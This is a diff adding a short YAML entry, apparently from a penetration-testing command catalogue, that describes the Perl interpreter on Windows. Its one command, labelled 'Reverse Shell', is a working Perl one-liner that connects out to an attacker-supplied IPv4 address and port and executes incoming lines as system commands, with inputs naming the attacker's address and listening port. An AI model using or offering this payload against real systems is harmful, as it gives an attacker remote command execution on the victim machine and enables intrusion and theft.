@@ -1,0 +1,15 @@
+---
+name: perl
+description: The Perl language interpreter
+os: Windows
+ptf_module: null
+---
+commands:
+  - "Reverse Shell":
+    - type: ["other","NX"]
+    - text: "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{IPV4}:{INT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
